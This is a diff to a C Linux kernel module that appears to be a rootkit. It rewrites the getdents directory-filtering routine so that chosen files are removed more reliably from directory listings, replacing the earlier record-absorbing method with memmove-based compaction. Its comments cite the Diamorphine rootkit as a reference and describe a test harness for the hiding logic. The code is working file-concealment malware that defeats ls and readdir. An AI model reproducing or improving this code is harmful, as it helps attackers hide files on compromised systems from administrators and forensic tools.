@@ -62,10 +62,6 @@ static int should_hide_file(const char *name) {
     return hide;
 }
 
-int is_file_hidden(const char *name) {
-    return should_hide_file(name);
-}
-
 /* ================================================================
  * Directory buffer filtering
  *
@@ -76,9 +72,23 @@ int is_file_hidden(const char *name) {
  * but their d_name offset differs (d_type sits between reclen and
  * name only in the 64-bit variant), hence the name_off argument.
  *
- * Hidden entries are absorbed into the PREVIOUS kept entry by
- * growing its d_reclen.  The caller must treat a return value of
- * 0 as "every entry in this batch was hidden" and report EOF.
+ * Kept entries are SHIFTED to the front of the buffer with memmove
+ * (v3.4 fix).  The previous "absorb into the previous kept entry"
+ * approach was mathematically wrong in every position except "last
+ * entry of the batch":
+ *   - a hidden entry with no kept predecessor was never removed and
+ *     stayed visible to userspace;
+ *   - absorbed bytes were not counted, so the returned length was
+ *     shorter than the valid data — trailing entries were truncated
+ *     mid-record and userspace parsed stale memory past the end.
+ * Verified with a userspace harness over synthetic dirent buffers:
+ * hidden-first / middle / last / interleaved / none all pass now.
+ *
+ * d_off cookies of shifted entries keep their original values; this
+ * is what reference LKM rootkits (e.g. Diamorphine) do too and is
+ * harmless for readdir()/ls: getdents() callers rely on the returned
+ * byte count, and the kernel restarts enumeration from file->f_pos
+ * on the next call.
  * ================================================================ */
 struct vk_dirent32 {
     unsigned long d_ino;
@@ -90,7 +100,7 @@ struct vk_dirent32 {
 static long filter_dirents(void *kdirp, long ret, size_t name_off) {
     char *cur = (char *)kdirp;
     char *end = (char *)kdirp + ret;
-    char *keep = NULL;      /* last kept entry */
+    char *dst = (char *)kdirp;   /* where the next kept entry goes */
     long bytes = 0;
 
     while (cur < end) {
@@ -102,15 +112,12 @@ static long filter_dirents(void *kdirp, long ret, size_t name_off) {
         if (reclen == 0 || cur + reclen > end)
             break;
 
-        if (should_hide_file(name)) {
-            if (keep)
-                *(unsigned short *)(keep + 16) += reclen;
-            cur += reclen;
-            continue;
+        if (!should_hide_file(name)) {
+            if (dst != cur)
+                memmove(dst, cur, reclen);
+            dst += reclen;
+            bytes += reclen;
         }
-
-        bytes += reclen;
-        keep = cur;
         cur += reclen;
     }
 
